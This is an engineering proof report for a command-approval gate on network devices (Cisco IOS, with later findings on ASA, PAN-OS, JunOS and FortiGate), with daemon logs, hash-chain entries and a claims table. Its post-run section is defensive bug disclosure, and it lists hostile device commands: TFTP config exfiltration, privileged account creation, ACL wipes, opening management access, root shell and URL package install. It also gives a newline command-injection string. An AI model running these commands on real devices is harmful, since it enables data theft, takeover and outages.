# Live Proof — Approval Flow & Error-Observation Typing (2026-07-23)

> **SCOPE: CISCO IOS ONLY.** Every claim in this document was exercised
> against one driver (`cisco_ios`, R1, a GNS3 C7200) using
> **single-command** submissions. It establishes nothing about ASA,
> PAN-OS, JunOS or FortiGate, and nothing about multi-command input.
> Cisco was, at the time of this run, the *only* driver whose classifier
> failed closed — so this run exercised the best case and generalised
> from it. See "What this run did not cover" below for what was later
> found on the other four.

Status: live run complete. Evidence below is verbatim from the CT 211
daemon journal (`journalctl -u virp-onode --utc`) and the live trust
chain (`/var/lib/virp/chain.db`, read read-only), captured on this host
on 2026-07-23. All timestamps UTC. Client-view observation sequence
numbers (seq=32/57/58/91) are as recorded by the operator's terminal
session; the two `[[OPERATOR TRANSCRIPT]]` slots are for the client-side
excerpts and do not change any claim — every claim row also carries
daemon-side evidence.

## Environment

- Host: CT 211 (`ironclaw-onode`, 10.0.0.211)
- Daemon: virp-onode-prod deployed 2026-07-23 17:09:18Z from
  `feature/approval-flow-and-error-obs` (commits b9cdf3a, 641f7e5,
  9cdd52a, a2c01ef, a812e5e, 3a5d736; merged to main as a fast-forward)
- Gate: ENFORCE default, max tier YELLOW; linux/wazuh drivers in SHADOW
- Approval flow enabled at startup:
  `17:09:18 [APPROVAL] enabled: dir=/var/lib/virp/approvals pubkey=/etc/virp/keys/approval.pub`
- Approval key id (Ed25519, dedicated): `5ff44d5f…`
- Target device: R1 — GNS3 Cisco IOS 7200 (10.0.0.50), driver cisco_ios
- Earlier partial run, pre-deploy daemon (for contrast): at 15:51:36 the
  OLD build still classified `clear counters` RED and logged the
  shadow-era wording:
  `15:51:36 [GATE] mode=ENFORCE device=R1 driver=cisco_ios tier=RED threshold=YELLOW decision=would-block command="clear counters"`

## Transcript excerpts (daemon journal, verbatim)

### T1 — YELLOW executes under the gate (Task 2 reclassification)

```
17:24:52 [GATE] mode=ENFORCE device=R1 driver=cisco_ios tier=YELLOW threshold=YELLOW decision=allow command="clear counters"
```

Client view (operator terminal): trust_tier=YELLOW, gate_decision=allowed,
observation seq=32.

[[OPERATOR TRANSCRIPT: `virp exec R1 "clear counters"` client output]]

### T2 — RED blocked: signed rejection + PROPOSAL filed

```
17:25:05 [GATE] mode=ENFORCE device=R1 driver=cisco_ios tier=RED threshold=YELLOW decision=block command="configure terminal"
17:25:05 [GATE] proposal filed: proposal=f9e1e2b15100595902072dd5f20aa4f1 device=R1 tier=RED chain=4d6a3e970a5669ba
17:25:05 [GATE] rejection persisted: session=gate-enforce:R1 seq=37 hash=b4bd296d78832b3f
17:25:05 [ERROR-OBS] device=R1 tier=RED executed=no reason="ERROR: tier gate blocked 'configure terminal' on 'R1' (tier=RED max=YELLOW) proposal_id=f9e1e2b15100595902072dd5f20aa4f1"
```

### T3 — Error observations typed 0x0f with true tier

Rejections above are `[ERROR-OBS] … tier=RED executed=no` (obs_type 0x0f
on the wire; the client prints `obs_type=0x0f (ERROR — signed rejection,
nothing executed)`). Connect-failures likewise carry the true tier of
the attempted command instead of blanket GREEN DEVICE_OUTPUT:

```
17:25:02 [ERROR-OBS] device=R1 tier=RED executed=no reason="ERROR: cannot connect to 'R1'"
17:36:43 [ERROR-OBS] device=R1 tier=RED executed=no reason="ERROR: cannot connect to 'R1'"
```

### T4 — apply without approval rejected (-41)

```
17:26:24 [GATE] apply rejected: proposal=f9e1e2b15100595902072dd5f20aa4f1 device=R1 code=-41 (approval_not_found)
17:26:24 [ERROR-OBS] device=R1 tier=RED executed=no reason="ERROR: apply rejected (approval_not_found, err=-41) for proposal f9e1e2b15100595902072dd5f20aa4f1 on 'R1' (tier=RED max=YELLOW)"
```

(Two consecutive attempts, both -41; bracketed by gate-rejection chain
seqs 38–39. Operator client view: observation seqs 38–39.)

### T5 — approve → apply executes RED under approval, OUTCOME chained

Approval `f9e1…` registered on-chain 17:34:26Z (chain `approval:R1`
seq=3), binding command_hash + device + 300 s TTL, signed with the
dedicated approval key (never the O-Key):

```
17:34:33 [GATE] mode=ENFORCE device=R1 driver=cisco_ios tier=RED threshold=YELLOW decision=block command="configure terminal"
17:34:33 [GATE] approval verified: proposal=f9e1e2b15100595902072dd5f20aa4f1 device=R1 tier=RED key_id=5ff44d5f — executing
17:34:33 [GATE] outcome persisted: proposal=f9e1e2b15100595902072dd5f20aa4f1 seq=4 hash=a514459fd01e54eb success=true
```

Operator client view: executed observation seq=57.

[[OPERATOR TRANSCRIPT: `virp apply f9e1e2b1…` client output]]

### T6 — reuse rejected (-37), same second

```
17:34:33 [GATE] apply rejected: proposal=f9e1e2b15100595902072dd5f20aa4f1 device=R1 code=-37 (approval_reused)
17:34:33 [ERROR-OBS] device=R1 tier=RED executed=no reason="ERROR: apply rejected (approval_reused, err=-37) for proposal f9e1e2b15100595902072dd5f20aa4f1 on 'R1' (tier=RED max=YELLOW)"
```

Operator client view: rejection observation seq=58.

### T7 — expired approval rejected (-36), 430 s elapsed vs 300 s TTL

Proposal `a7b3c30e…` filed 17:42:08Z; approved 17:42:37Z (chain
`approval:R1` seq=11); applied 17:49:47Z — 430 s after approval:

```
17:42:08 [GATE] proposal filed: proposal=a7b3c30eb76cbbcc32855b07eeb9b9bc device=R1 tier=RED chain=ce8c86cc5fb15939
17:49:47 [GATE] apply rejected: proposal=a7b3c30eb76cbbcc32855b07eeb9b9bc device=R1 code=-36 (approval_expired)
17:49:47 [ERROR-OBS] device=R1 tier=RED executed=no reason="ERROR: apply rejected (approval_expired, err=-36) for proposal a7b3c30eb76cbbcc32855b07eeb9b9bc on 'R1' (tier=RED max=YELLOW)"
```

Operator client view: rejection observation seq=91.

### T8 — chain: PROPOSAL → APPROVAL → OUTCOME, hash-linked

`virp chain tail` against the live chain (each row's PREV_HASH is the
prior row's ENTRY_HASH within the session; f9e1 flow shown):

```
SESSION       SEQ  TYPE      ARTIFACT_ID                                ENTRY_HASH        PREV_HASH
approval:R1   0    proposal  proposal:f9e1e2b15100595902072dd5f20aa4f1  4d6a3e970a5669ba  31b94501e1a08cfc
approval:R1   3    approval  approval:f9e1e2b15100595902072dd5f20aa4f1  25414426b371eb4a  d3d827b31a17ebd9
approval:R1   4    outcome   outcome:f9e1e2b15100595902072dd5f20aa4f1   a514459fd01e54eb  25414426b371eb4a
```

Full `approval:R1` session with chain-recorded UTC timestamps:

```
seq 0  proposal  f9e1e2b1…  17:25:05Z
seq 1  proposal  f5711180…  17:25:05Z
seq 2  proposal  4e753b49…  17:26:24Z
seq 3  approval  f9e1e2b1…  17:34:26Z
seq 4  outcome   f9e1e2b1…  17:34:33Z   (success=true)
seq 5  approval  f5711180…  17:34:33Z
seq 6  approval  f9e1e2b1…  17:35:05Z   ← re-approval AFTER outcome (Finding L1)
seq 7  outcome   f5711180…  17:36:19Z   (success=true)
seq 8  approval  4e753b49…  17:38:25Z
seq 9  outcome   4e753b49…  17:40:07Z   (success=true)
seq 10 proposal  a7b3c30e…  17:42:08Z
seq 11 approval  a7b3c30e…  17:42:37Z   (expired at apply, 17:49:47Z)
```

## Claims table

Every row DEMONSTRATED-LIVE on 2026-07-23 against R1 (GNS3 IOS 7200)
through the deployed daemon, plus the checked-in suite named per row.

| Claim | Live evidence | Suite evidence |
|---|---|---|
| Error observations are typed 0x0f (ERROR) and carry the command's true tier | T3 (17:25:02, 17:36:43 connect-failures at tier=RED; every `[ERROR-OBS]` line) | `tests/test_onode.c`: `test_error_obs_connect_failure_is_error_with_true_tier`, `test_error_obs_driver_refusal_is_error_not_output`, `test_error_obs_gate_block_logs_as_error_not_change` |
| YELLOW executes under the ENFORCE gate (`clear counters` reclassified) | T1 (17:24:52 `decision=allow`, client seq=32) | `src/drivers/driver_cisco.c` table row; gate path in `tests/test_onode.c` |
| RED blocked with signed rejection + PROPOSAL filed, proposal_id in payload | T2 (17:25:05, proposal f9e1…, chain 4d6a3e97…) | `tests/test_approval.c`: `test_block_files_proposal`, `test_cli_exec_red_rejected_with_proposal` |
| Approve binds command_hash + device + 300 s TTL with the dedicated Ed25519 key | T5/T8 (approval entries, key_id=5ff44d5f) | `tests/test_approval.c`: `test_e2e_propose_approve_apply`, `test_daemon_refuses_secret_key` |
| Apply executes RED under approval; OUTCOME chained to PROPOSAL+APPROVAL | T5 (f9e1…, client seq=57, outcome chain seq=4 hash a514459f…) | `tests/test_approval.c`: `test_e2e_propose_approve_apply` |
| Reused approval rejected with -37 | T6 (17:34:33, client seq=58) | `tests/test_approval.c`: `test_reused_approval_rejected`, `test_reuse_survives_restart` |
| Apply without approval rejected with -41 | T4 (17:26:24 ×2, chain gate-rejection seqs 38–39) | `tests/test_approval.c`: `test_no_approval_plain_block` |
| Expired approval rejected with -36 | T7 (a7b3c30e…, approved 17:42:37Z, applied 17:49:47Z, 430 s elapsed, client seq=91) | `tests/test_approval.c`: `test_expired_approval_rejected` |
| Chain shows PROPOSAL → APPROVAL → OUTCOME hash-linked | T8 (`approval:R1` seqs 0/3/4, PREV_HASH linkage) | `tests/test_approval.c`: `test_cli_chain_tail_format` |

## Caveats (af92763 conservative standard)

- **v1 bridge path.** All live responses were v1 master-key-signed
  messages; the bridge cannot verify v2 observations until the
  handshake echoes server timestamps (known open item). Client-side v2
  verification of the approval flow is therefore NOT demonstrated.
- **Single device family.** The approval flow was exercised live against
  one device family only: Cisco IOS (C7200 under GNS3). Other drivers
  are covered by the suite's mock-driver paths, not live.
- **TTL granularity.** Expiry was demonstrated at 430 s elapsed against
  the 300 s window — the boundary region (300–430 s) is untested live;
  the suite's `test_expired_approval_rejected` covers TTL+100 s with a
  crafted timestamp, not a boundary sweep.

## What this run did not cover (added 2026-07-28)

This proof was read for two months as evidence about "the gate". It is
evidence about the Cisco gate, on single commands. Three defects found
afterwards were all outside its reach:

**1. The other four drivers defaulted unrecognized commands to YELLOW.**
Cisco's classifier failed closed to RED for anything unlisted. ASA,
PAN-OS, JunOS and FortiGate returned **YELLOW**, which clears the default
YELLOW gate threshold — so an unrecognized command *executed*, under
ENFORCE, with a signed observation recording it as a routine YELLOW
operation. Fixed in `e8f1c95`. What that meant in practice, measured
against the pre-fix classifiers:

| Driver | Command | Pre-fix tier | Effect |
|---|---|---|---|
| ASA | `copy running-config tftp://10.0.0.9/cfg` | YELLOW → executed | full config exfiltration |
| ASA | `username admin password Str0ng privilege 15` | YELLOW → executed | privileged account creation |
| ASA | `clear configure access-list` | YELLOW → executed | ACL wipe |
| PAN-OS | `commit` | YELLOW → executed | applies the entire candidate config |
| PAN-OS | `delete rulebase security rules TRUST-ANY` | YELLOW → executed | firewall rule deletion |
| PAN-OS | `set deviceconfig system permitted-ip 0.0.0.0` | YELLOW → executed | opens mgmt plane to the world |
| PAN-OS | `request restart system` | YELLOW → executed | firewall reboot |
| JunOS | `start shell` | YELLOW → executed | drops to a root shell |
| JunOS | `request system software add http://<url>` | YELLOW → executed | arbitrary package install |
| FortiGate | `set password ABC123` | YELLOW → executed | credential write |

Note the asymmetry that hid this: JunOS `request system software delete`
was correctly BLACK while `request system software add <url>` fell to the
default and ran.

**2. Multi-command injection was never submitted.** Every classifier
prefix-matched from index 0 while the drivers sent the whole string to
the device, so `"show version\nreload"` classified GREEN on its first
line and the `reload` reached the wire ungated. Closed in `b3985e1`
(daemon boundary + Cisco classifier) and `19c0054` (remaining four).

**3. Juniper shipped a multi-command splitter.** `junos_execute` split on
`;` and `\n` and ran each sub-command in one PTY session, having been
classified once on its first token. Deleted in `0a0d75b`.

## Findings from live testing (deferred — fix directions only)

- **L1 — Re-approval of an executed proposal mints a valid new
  approval.** Single-use is enforced against the consumed proposal_id at
  apply time, but `virp approve` will happily re-sign a proposal whose
  OUTCOME already exists: chain `approval:R1` seq=6 shows a second
  approval of `f9e1…` at 17:35:05Z, 32 s after its outcome (seq=4,
  17:34:33Z) — the approve passed all checks. The consumed store then
  rejects the re-apply (the -37 at 17:34:33 predates seq=6; no second
  execution occurred), but a fresh approval record for an
  already-executed change is misleading audit state. Fix direction:
  `virp approve` refuses proposals that already have an OUTCOME chain
  entry unless an explicit `--re-approve` flag is given.
- **L2 — Interactive prompts and config mode wedge the session.** IOS
  confirmation prompts (`[confirm]`, e.g. after `clear counters`) are
  not answered by the driver, leaving the console hung — the very next
  submission failed with `cannot connect` (17:25:02) until the watchdog
  recycled the session. A successful `configure terminal` apply likewise
  leaves the device in config mode, blocking subsequent connects
  (watchdog `Health check failed: R1 — dropping` at 17:34:44 and
  17:36:30, each immediately after an outcome). Fix direction: driver
  answers/declines confirmation prompts explicitly and exits config mode
  (or resets the session) after an approved config-entering command.
- **L3 — Blocked command to a busy device reports connect-failure, not
  the gate decision.** Pre-existing FINDINGS #5, now observed live: at
  17:25:02 a RED `configure terminal` against the wedged R1 returned
  `ERROR: cannot connect` (tier=RED) instead of the gate rejection,
  because the gate check runs after the connection attempt. Fix
  direction: evaluate the gate before connecting.
